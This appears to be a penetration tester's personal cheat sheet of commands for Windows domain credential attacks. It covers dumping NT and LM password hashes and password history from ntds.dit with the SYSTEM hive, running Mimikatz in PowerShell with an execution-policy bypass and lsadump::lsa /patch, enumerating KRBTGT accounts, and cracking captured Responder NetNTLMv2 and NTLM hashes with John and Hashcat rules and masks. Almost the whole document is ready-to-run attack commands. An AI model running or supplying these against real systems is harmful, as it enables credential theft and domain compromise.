# Determine algorithm using powershell
gci -Recurse | select FullName | %{get-Filehash -Algorithm md5 -Path $_.FullName ; get-FileHash -Algorithm sha1 -Path $_.FullName} | format-list
gci -Recurse | select FullName | %{get-Filehash -Algorithm md5 -Path $_.FullName ; get-FileHash -Algorithm sha1 -Path $_.FullName} | out-gridview

# Step 1. Export datatable from ntds.dit
esedbexport -T datatable ntds.dit

# Step 2. Extract hashes from datatable. Use dsdump.py to dump the hashes from the datatable using the bootkey from the SYSTEM hive.
python ~/Applications/Password/ntdsextract/dsusers.py ntds.dit.export/datatable.2  ntds.dit.export/link_table.3 ~/Applications/Password/TEMP --passwordhashes --passwordhistory --lmoutfile LMophc.out --ntoutfile ~/Applications/Password/NTophc.out --pwdformat ophc --syshive SYSTEM

python ~/Applications/Password/ntdsextract/dsusers.py ntds.dit.export/datatable.2  ntds.dit.export/link_table.3 ~/Applications/Password/TEMP --passwordhashes --passwordhistory --lmoutfile LMjohn.out --ntoutfile ~/Applications/Password/NTjohn.out --pwdformat john --syshive SYSTEM

python ~/Applications/Password/ntdsextract/dsusers.py datatable.3  link_table.5 ~/Applications/Password/TEMP --passwordhashes --passwordhistory --lmoutfile LMocl.out --ntoutfile ~/Applications/Password/NTocl.out --pwdformat ocl --syshive SYSTEM


# Powershell mimikatz
powershell -ExecutionPolicy Bypass
Import-Module .\Untitled1.ps1
Invoke-Mimiket -command '"lsadump::lsa /patch"'
Invoke-mimiket

# ImpDump alternative to esedbexport
esentutl.py ntds.dit export -table datatable | grep -E "ATTk590689|ATTm3|ATTm590045|ATTr589970|ATTk589914|ATTk589879|ATTk589984|ATTk589918" > output
python /home/<username>/Applications/Password/ImpDump/impdump.py SYSTEM output > hashes.txt
python /home/<username>/Applications/Password/ImpDump/impdump.py SYSTEM output -history > hash_history.txt


----------------------------------------------------------------------------------------------------------------
# Identify KRBTGT account info (including the key version number – tracks password changes) for every domain in the AD forest. (Run on DC only)
# Powershell
# Import-Module ActiveDirectory -  http://www.microsoft.com/download/en/details.aspx?id=7887

import-module activedirectory
$ADForestRootDomain = (Get-ADForest).RootDomain
$AllADForestDomains = (Get-ADForest).Domains
$ForestKRBTGTInfo = @()
ForEach ($AllADForestDomainsItem in $AllADForestDomains)
{
[string]$DomainDC = (Get-ADDomainController -Discover -Force -Service “PrimaryDC” -DomainName $AllADForestDomainsItem).HostName
[array]$ForestKRBTGTInfo += Get-ADUSer -filter {name -like “krbtgt*”} -Server $DomainDC -Prop Name,Created,logonCount,Modified,PasswordLastSet,PasswordExpired,msDS-KeyVersionNumber,CanonicalName,msDS-KrbTgtLinkBl
}
$ForestKRBTGTInfo | Select Name,Created,logonCount,PasswordLastSet,PasswordExpired,msDS-KeyVersionNumber,CanonicalName | ft -auto



----------------------------------------------------------------------------------------------------------------

Build custom wordlist based on URL.
./cewl.rb -v -w domain.txt https://www.domain.com/

----------------------------------------------------------------------------------------------------------------

# Password Crackers commands and formats


# John
sudo ldconfig /usr/local/cuda-7.0/lib64/
~/Applications/Password/john-1.7.9-jumbo-7/run$ ./john --wordlist=/home/user/Applications/Password/Wordlists/massiveWordlist.txt /home/user/Applications/Windows/Responder/logs/*.txt
~/Applications/Password/john-1.7.9-jumbo-7/run $ ./john --format=lm --wordlist=/home/user/Applications/Password/Wordlists/massiveWordlist.txt /home/user/Desktop/Shared/Clients/<client>lanmanJohn.out

./john --fork=2 --devices=0,1 --format=sha512crypt-opencl ~/Applications/Password/Challenge/sha512crypt.txt


# Korelogic rules applied - john-1.8.0-j1-cuda
sudo ./john --fork=6 -w:/home/user/Applications/Password/Wordlists/massiveWordlist.txt --format=netntlmv2 --rules:KoreLogicRulesL33t /home/user/Applications/Windows/Responder/logs/*.txt (1 hr 34 min +)
sudo ./john --fork=6 -w:/home/user/Applications/Password/Wordlists/massiveWordlist.txt --format=netntlmv2 /home/user/Applications/Windows/Responder/logs/*.txt (~1 min)
sudo ./john --fork=6 -w:/home/user/Applications/Password/Wordlists/massiveWordlist.txt --format=netntlmv2 --rules:KoreLogicRulesReplaceLettersCaps /home/user/Applications/Windows/Responder/logs/*.txt (~5 min)

--rules:
KoreLogicRulesL33t
KoreLogicRulesReplaceLettersCaps  (< 1 min)
KoreLogicRulesAppendNumbers_and_Specials_Simple (5hr 45min)


----------------------------------------------------------------------------------------------------------------
Hashcat:

Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict

hashcat64.exe -m 1000 -a 0 -w 3 G:\hashcat-3.6.0\HAshes\hashes.txt Dict\massiveSortedWordlist.txt
hashcat64.exe -m 1000 -a 6 -w 3 G:\hashcat-3.6.0\HAshes\hashes.txt Dict\google-10000-english-usa.txt masks\custom.hcmask 
hashcat64.exe -m 1000 -a 6 -w 3 G:\hashcat-3.6.0\HAshes\hashes.txt Dict\1M.txt masks\custom.hcmask
hashcat64.exe -m 1000 -a 3 -w 3 -i --increment-min 9 G:\hashcat-3.6.0\HAshes\hashes.txt masks\custom.hcmask




### Hashcat Table-attack for cudaHashcat

./hashcat-cli -a 5 --table-file name.table --stdout | ./cudaHashcat64.bin 

?u?l?l?l?l?l?l?s
?l?l?l?l?l?d?d?s
?l?l?l?l?d?d?d?s
?l?l?l?d?d?d?d?s
?u?l?l?l?l?l?d?d
?u?l?l?l?l?l?l?d
?u?l?l?l?l?l?l?l?s
?u?l?l?l?l?l?l?l?d
?u?l?l?l?l?d?d?d?d
?u?l?l?l?l?l?l?d?d
?u?l?l?l?l?l?d?d?d
?u?l?l?l?d?d?d?d?s
?u?l?l?l?l?l?d?d?s
?s?u?l?l?l?d?d?d?d
?l?l?l?l?l?l?l?d?s
?l?l?l?l?l?l?d?d?s
?l?l?l?l?d?d?d?d?s


/home/<dir>/Applications/Password/Wordlists/10_million_password_list_top_1000000.txt ?l?l?l?l?d

hashcat -a 1 -m 0 hash.txt google-10000.txt google-10000.txt

hashcat64.exe -a 0 -m 0 --session=test -w 3 -o Cracked.txt -r rules\nsa64.rule g:\share\raw-md5.hashes.txt massiveSortedWordlist.txt

************* May not need ***********************
# Merge cudaHashcat pot file with origional *NTLM* hash dump w/ usernames. Requires spaces as column separators.
awk -F" " 'BEGIN { OFS = FS } NR == FNR { val[$2] = $1; next } $1 in val { $(NF + 1) = val[$1]; print }' <hashfileWusernames> <hashfileWpasswords>

# Strip out : and everything before it.
sed 's/.*://'

# Strip out eveything after ,
sed -i 's/,.*$//' dict2.hcmask

# Sort wordlist based on length
cat uCracked.txt | awk '{ print length, $0 }' | sort -n -s | cut -d" " -f2- >> Wordlists/massiveSortedWordlist.txt
